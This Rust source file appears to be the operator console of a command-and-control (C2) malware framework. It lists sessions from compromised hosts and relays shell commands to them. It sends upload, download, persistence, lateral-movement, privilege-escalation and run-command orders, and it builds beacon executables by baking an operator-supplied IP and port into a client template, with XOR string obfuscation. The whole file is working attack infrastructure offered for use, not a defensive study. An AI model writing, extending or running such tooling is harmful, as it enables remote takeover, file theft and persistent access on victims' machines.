use crate::handle_clients;
use crate::models::Beacon;
use async_recursion::async_recursion;
use std::ops::DerefMut;
use std::path::{Path, PathBuf};
use tempfile::TempDir;
use tokio::fs;
use tokio::process::Command;
use xorcrypt::{e, prepare_encryption};

prepare_encryption!();
use crate::{
    input,
    models::{download_file, substr_exists, Client},
    ClientList,
};
pub async fn sessions(args: &[String], clients: &ClientList) {
    if args.is_empty() {
        let clients_guard = clients.clients.lock().await;
        if clients_guard.len() > 0 {
            println!("\n[i] Active sessions:");
            for (index, client) in clients_guard.iter().enumerate() {
                println!("  {} - {}", index, client.addr);
            }
            println!();
        } else {
            println!("[-] No sessions active")
        }
    } else {
        match args[0].as_str() {
            "i" | "interact" => {
                if let Some(session_number) = args.get(1) {
                    match session_number.parse() {
                        Ok(session_number) => interact(session_number, &clients.clone()).await,
                        Err(_) => println!("[-] Invalid session number"),
                    }
                } else {
                    println!("[-] No session number supplied");
                }
            }
            _ => {
                println!("[-] Invalid argument");
            }
        }
    }
}

async fn interact(session_number: u32, clients: &ClientList) {
    let clients_guard = clients.clients.lock().await;
    if !(0..clients_guard.len()).contains(&(session_number as usize)) {
        return println!("[-] Session does not exist");
    }
    drop(clients_guard);

    loop {
        match input("Shell: ".to_string()).await {
            Some(cmd) => {
                let cmd = cmd.trim().to_string();
                if cmd.is_empty() {
                    continue;
                }
                if cmd.starts_with(':') {
                    if let Some(cmd) = cmd.strip_prefix(':') {
                        match shell_commands(cmd, &mut clients.clone(), session_number).await {
                            Ok(_) => continue,
                            Err(_) => {
                                break;
                            }
                        }
                    }
                }

                let mut clients_write_guard = clients.clients.lock().await;
                let client = clients_write_guard
                    .get_mut(session_number as usize)
                    .unwrap();
                if client.write(cmd.as_bytes()).await.is_err() {
                    drop(clients_write_guard);
                    disconnected(clients, session_number).await;
                    break;
                }
                drop(clients_write_guard);

                let mut clients_read_guard = clients.clients.lock().await;
                let client = clients_read_guard.get_mut(session_number as usize).unwrap();
                match client.read().await {
                    Ok(incoming) => {
                        if incoming == b"::EOF::".to_vec() {
                            drop(clients_read_guard);
                            disconnected(clients, session_number).await;
                            break;
                        }
                        let incoming = String::from_utf8(incoming).unwrap();
                        print!("{}", incoming);
                    }
                    Err(_) => {
                        drop(clients_read_guard);
                        disconnected(clients, session_number).await;
                        break;
                    }
                }
            }
            None => {
                continue;
            }
        }
    }
}

async fn disconnected(clients: &ClientList, session_number: u32) {
    let mut clients_guard = clients.clients.lock().await;
    clients_guard.remove(session_number as usize);
    println!("[-] Session {} has disconnected", session_number);
}

async fn shell_commands(
    cmd: &str,
    clients: &mut ClientList,
    session_number: u32,
) -> Result<(), ()> {
    let cmd = cmd
        .split(' ')
        .map(|x| x.to_string())
        .collect::<Vec<String>>();
    let (cmd, args) = (&cmd[0], &cmd[1..]);
    match cmd.as_str() {
        "b" | "back" => Err(()),
        "e" | "exit" => {
            let mut guard = clients.clients.lock().await;
            guard.deref_mut().remove(session_number as usize);
            Err(())
        }
        "u" | "upload" => match args.first() {
            Some(utype) => match args.get(1) {
                Some(filepath) => {
                    let mut destination = &"".to_string();
                    if let Some(arg_dest) = args.get(2) {
                        destination = arg_dest;
                    }
                    process_upload(utype, filepath, destination, clients, session_number).await
                }
                None => {
                    println!("[-] File name or url must be supplied");
                    Ok(())
                }
            },
            None => {
                println!("[-] Please specify an upload type");
                Ok(())
            }
        },
        "d" | "download" => match args.first() {
            Some(filename) => {
                let mut guard = clients.clients.lock().await;
                let client = guard.get_mut(session_number as usize).unwrap();
                if client
                    .write(format!("::DOWNLOAD:: {}", filename).as_bytes())
                    .await
                    .is_err()
                {
                    return Err(());
                }
                match client.read().await {
                    Ok(incoming) => {
                        if substr_exists(&incoming, e!("::STARTFILE::").as_bytes()).await {
                            download_file(&incoming).await;
                            println!("[+] File downloaded successfully");
                            Ok(())
                        } else {
                            println!("{}", String::from_utf8(incoming).unwrap());
                            Ok(())
                        }
                    }
                    Err(_) => Err(()),
                }
            }
            None => Err(()),
        },
        "p" | "persist" => match args.first() {
            Some(filename) => {
                let mut guard = clients.clients.lock().await;
                let client = guard.get_mut(session_number as usize).unwrap();
                if client
                    .write(format!("::PERSIST:: {}", filename).as_bytes())
                    .await
                    .is_err()
                {
                    return Err(());
                }
                match client.read().await {
                    Ok(incoming) => {
                        println!("{}", String::from_utf8(incoming).unwrap());
                        Ok(())
                    }
                    Err(_) => Err(()),
                }
            }
            None => Err(()),
        },
        "l" | "latmove" => {
            let mut guard = clients.clients.lock().await;
            let client = guard.get_mut(session_number as usize).unwrap();
            if client
                .write(format!("::LATMOVE::").as_bytes())
                .await
                .is_err()
            {
                return Err(());
            }
            match client.read().await {
                Ok(incoming) => {
                    println!("{}", String::from_utf8(incoming).unwrap());
                    Ok(())
                }
                Err(_) => Err(()),
            }
        }
        "pe" | "privesc" => {
            let mut guard = clients.clients.lock().await;
            let client = guard.get_mut(session_number as usize).unwrap();
            if client.write("::PRIVESC::".as_bytes()).await.is_err() {
                return Err(());
            }
            match client.read().await {
                Ok(incoming) => {
                    println!("{}", String::from_utf8(incoming).unwrap());
                    Ok(())
                }
                Err(_) => Err(()),
            }
        }
        "r" | "runcmd" => match args.first() {
            Some(command) => {
                let mut guard = clients.clients.lock().await;
                let client = guard.get_mut(session_number as usize).unwrap();
                if client
                    .write(format!("::RUNCMD:: {}", command).as_bytes())
                    .await
                    .is_err()
                {
                    return Err(());
                }
                match client.read().await {
                    Ok(incoming) => {
                        println!("{}", String::from_utf8(incoming).unwrap());
                        Ok(())
                    }
                    Err(_) => Err(()),
                }
            }
            None => Err(()),
        },
        "h" | "help" => {
            print_help().await;
            Ok(())
        }
        _ => Ok(()),
    }
}

pub async fn print_help() {
    println!("Available commands:");
    println!("  b, back - Go back");
    println!("  e, exit - Exit the session");
    println!("  u, upload <type> <filepath> [destination] - Upload a file");
    println!("  d, download <filename> - Download a file");
    println!("  p, persist <filename> - Persist a file");
    println!("  l, latmove <target> - Perform lateral movement to a target");
    println!("  pe, privesc - Attempt privilege escalation");
    println!("  r, runcmd <command> - Execute a custom command");
    println!("  h, help - Show this help message");
}

async fn process_upload(
    utype: &str,
    filepath: &String,
    destination: &String,
    clients: &mut ClientList,
    session_number: u32,
) -> Result<(), ()> {
    match utype {
        "l" | "local" => local_upload(filepath, destination, clients, session_number).await,
        "r" | "remote" => remote_upload(filepath, destination, clients, session_number).await,
        _ => {
            println!("[-] Invalid upload type");
            Ok(())
        }
    }
}

async fn remote_upload(
    url: &String,
    destination: &String,
    clients: &mut ClientList,
    session_number: u32,
) -> Result<(), ()> {
    match reqwest::get(url).await {
        Ok(response) => {
            if destination.is_empty() {
                println!("[-] Destination cannot be empty");
                Ok(())
            } else {
                let mut guard = clients.clients.lock().await;
                let client = guard.get_mut(session_number as usize).unwrap();
                upload_file(
                    client,
                    destination,
                    response.bytes().await.unwrap().to_vec(),
                )
                .await
            }
        }
        Err(_) => {
            println!("[-] Error downloading file");
            Ok(())
        }
    }
}

async fn local_upload(
    mut filename: &String,
    destination: &String,
    clients: &mut ClientList,
    session_number: u32,
) -> Result<(), ()> {
    match tokio::fs::read(filename).await {
        Ok(data) => {
            let mut guard = clients.clients.lock().await;
            let client = guard.get_mut(session_number as usize).unwrap();
            if !destination.is_empty() {
                filename = destination;
            }
            match upload_file(client, filename, data).await {
                Ok(_) => Ok(()),
                Err(_) => {
                    std::mem::drop(guard);
                    disconnected(clients, session_number).await;
                    Err(())
                }
            }
        }
        Err(_) => {
            println!("[-] File not found");
            Ok(())
        }
    }
}

async fn upload_file(client: &mut Client, filename: &String, data: Vec<u8>) -> Result<(), ()> {
    if client.write_file(data, filename.as_bytes()).await.is_err() {
        return Err(());
    };
    match client.read().await {
        Ok(data) => {
            println!("{}", String::from_utf8(data).unwrap());
            Ok(())
        }
        Err(_) => Err(()),
    }
}

pub async fn list_listeners(clients: &ClientList) {
    let listeners = clients.listeners.lock().await;
    for listener in listeners.iter() {
        println!("{}", listener);
    }
}

pub async fn create_listener(args: &[String], clients: ClientList) {
    if args.len() != 1 {
        println!("[-] Usage: create_listener <port>");
        return;
    }
    let port = args[0].clone();
    tokio::spawn(handle_clients(clients, port));
    println!("[+] Listener created on port {}", args[0]);
}

fn is_valid_file_path(path: &str) -> bool {
    match std::fs::File::create(path) {
        Ok(_) => {
            std::fs::remove_file(path).unwrap();
            true
        }
        Err(_) => false,
    }
}

pub async fn generate_beacon(_args: &[String]) -> Result<Beacon, String> {
    let file_path = get_file_path().await?;
    let (ip, port) = get_beacon_details().await?;

    let temp_dir = TempDir::new().map_err(|e| e.to_string())?;
    let project_dir = temp_dir.path().to_owned();
    let crate_name = "client";

    println!("[*] Temporary project directory: {:?}", project_dir);

    create_project_files(&project_dir, &ip, &port).await?;

    compile_beacon(&project_dir, crate_name).await?;

    let dist_path = copy_executable(&project_dir, &file_path).await?;

    let beacon = Beacon {
        ip,
        port,
        file_path: dist_path.to_str().unwrap().to_string(),
    };

    Ok(beacon)
}

async fn get_file_path() -> Result<String, String> {
    let file_path = input(
        "Enter the file path to save the beacon (e.g., C:\\path\\to\\beacon.exe): ".to_string(),
    )
    .await
    .unwrap()
    .trim()
    .to_string();

    if file_path.is_empty() {
        return Err("File path cannot be empty".to_string());
    }

    let dir_path = Path::new(&file_path)
        .parent()
        .unwrap_or_else(|| Path::new(""));
    if !dir_path.exists() && !dir_path.as_os_str().is_empty() {
        println!("[*] Creating directory: {:?}", dir_path);
        fs::create_dir_all(dir_path)
            .await
            .map_err(|e| e.to_string())?;
    }

    if !is_valid_file_path(&file_path) {
        return Err("Invalid file path".to_string());
    }

    Ok(file_path)
}

async fn get_beacon_details() -> Result<(String, String), String> {
    let ip = input("Enter the IP address: ".to_string())
        .await
        .unwrap()
        .trim()
        .to_string();
    let port = input("Enter the port number: ".to_string())
        .await
        .unwrap()
        .trim()
        .to_string();

    if !is_valid_ip(&ip) {
        return Err("Invalid IP address".to_string());
    }
    if !is_valid_port(&port) {
        return Err("Invalid port number".to_string());
    }

    Ok((ip, port))
}

async fn create_project_files(project_dir: &Path, ip: &str, port: &str) -> Result<(), String> {
    fs::create_dir_all(project_dir)
        .await
        .map_err(|e| e.to_string())?;

    let client_project_path = Path::new("client");
    let new_client_project_path = project_dir.join("client");
    fs::create_dir_all(&new_client_project_path)
        .await
        .map_err(|e| e.to_string())?;
    recursive_copy(client_project_path, &new_client_project_path).await?;

    let main_rs_path = new_client_project_path.join("src/main.rs");
    let mut main_rs_content = fs::read_to_string(&main_rs_path)
        .await
        .map_err(|e| e.to_string())?;
    main_rs_content = main_rs_content.replace("BEACON_IP", ip);
    main_rs_content = main_rs_content.replace("BEACON_PORT", port);
    fs::write(&main_rs_path, main_rs_content)
        .await
        .map_err(|e| e.to_string())?;

    let xorcrypt_project_path = Path::new("xorcrypt");
    let xorcrypt_src_dir = project_dir.join("xorcrypt/src");
    fs::create_dir_all(&xorcrypt_src_dir)
        .await
        .map_err(|e| e.to_string())?;
    fs::copy(
        xorcrypt_project_path.join("src/lib.rs"),
        xorcrypt_src_dir.join("lib.rs"),
    )
    .await
    .map_err(|e| e.to_string())?;
    fs::copy(
        xorcrypt_project_path.join("Cargo.toml"),
        project_dir.join("xorcrypt/Cargo.toml"),
    )
    .await
    .map_err(|e| e.to_string())?;

    Ok(())
}

#[async_recursion]
async fn recursive_copy(src: &Path, dst: &Path) -> Result<(), String> {
    let mut dir = fs::read_dir(src).await.map_err(|e| e.to_string())?;
    while let Some(entry) = dir.next_entry().await.map_err(|e| e.to_string())? {
        let ty = entry.file_type().await.map_err(|e| e.to_string())?;
        let new_dst = dst.join(entry.file_name());
        if ty.is_dir() {
            fs::create_dir_all(&new_dst)
                .await
                .map_err(|e| e.to_string())?;
            recursive_copy(&entry.path(), &new_dst).await?;
        } else {
            fs::copy(entry.path(), new_dst)
                .await
                .map_err(|e| e.to_string())?;
        }
    }
    Ok(())
}

async fn compile_beacon(project_dir: &Path, crate_name: &str) -> Result<(), String> {
    println!("[*] Compiling the beacon code...");
    let output = Command::new("cargo")
        .current_dir(project_dir.join(crate_name))
        .arg("build")
        .arg("--release")
        .output()
        .await
        .map_err(|e| e.to_string())?;

    if output.status.success() {
        println!("[*] Compilation successful");
        Ok(())
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        println!("[!] Compilation failed: {}", stderr);
        Err(format!("Failed to compile beacon: {}", stderr))
    }
}

async fn copy_executable(project_dir: &Path, executable_name: &str) -> Result<PathBuf, String> {
    let original_executable_name = if cfg!(target_os = "windows") {
        "client.exe"
    } else {
        "client"
    };
    let executable_path = project_dir
        .join("client")
        .join("target/release")
        .join(original_executable_name);
    if !executable_path.exists() {
        println!(
            "[!] Compiled executable not found at: {:?}",
            executable_path
        );
        return Err("Compiled executable not found".to_string());
    }

    let dist_path = Path::new("dist").join(executable_name);
    println!(
        "[*] Copying executable from {:?} to {:?}",
        executable_path, dist_path
    );
    fs::copy(&executable_path, &dist_path)
        .await
        .map_err(|e| e.to_string())?;

    Ok(dist_path)
}

fn is_valid_ip(ip: &str) -> bool {
    let parts: Vec<&str> = ip.trim().split('.').collect();
    if parts.len() != 4 {
        return false;
    }
    for part in parts {
        if part.parse::<u8>().is_err() {
            return false;
        }
    }
    true
}

fn is_valid_port(port: &str) -> bool {
    port.trim().parse::<u16>().is_ok()
}
